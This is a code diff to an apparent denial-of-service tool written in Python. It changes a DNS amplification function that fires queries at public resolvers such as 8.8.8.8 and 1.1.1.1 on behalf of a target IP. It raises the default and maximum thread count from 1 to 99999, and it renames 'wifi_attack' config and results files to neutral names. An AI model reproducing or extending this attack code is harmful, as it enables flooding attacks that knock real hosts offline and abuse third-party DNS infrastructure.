@@ -36,8 +36,8 @@ VERSION = "2.0"
 DEVELOPER = "Security Tool"
 WHITELIST = ['127.0.0.1']
 BLACKLIST = []
-CONFIG_FILE = "wifi_attack_config.json"
-RESULTS_FILE = "attack_results.txt"
+CONFIG_FILE = "Config.json"
+RESULTS_FILE = "Results.txt"
 
 # ============================================
 # ASCII ART & UI
@@ -421,7 +421,7 @@ def dns_amplification(ip, duration, thread_id=1):
     print(Fore.CYAN + f"[🚀] Thread-{thread_id}: DNS Amplification targeting {ip}")
     
     dns_servers = ['8.8.8.8', '8.8.4.4', '1.1.1.1', '1.0.0.1', '9.9.9.9', '202.95.128.180']
-    query = b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00'
+    query = b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00'
     query += b'\x07example\x03com\x00\x00\x01\x00\x01'
     
     end_time = time.time() + duration
@@ -599,7 +599,7 @@ def get_attack_parameters():
     packet_size = validate_input("\033[97mPacket size in bytes (65500): \033[92m", 1, 65500, default=65500)
     
     # Thread count
-    thread_count = validate_input("\033[97mThread count (default 1): \033[92m", 1, 1, default=1)
+    thread_count = validate_input("\033[97mThread count (default 99999): \033[92m", 1, 99999, default=99999)
     
     return {
         'ip': ip,
@@ -729,8 +729,8 @@ def show_settings():
     global WHITELIST, BLACKLIST
     
     print_banner()
-    print(Fore.LIGHTBLUE_EX + "🔹  SETTINGS & CONFIGURATION  🔹")
-    print("\033[94m" + "="*40)
+    print(Fore.LIGHTBLUE_EX + "   🔹 SETTINGS & CONFIGURATION 🔹   ")
+    print("\033[94m" + "="*37)
     
     print()
     print(Fore.YELLOW + "[1] View Whitelist")
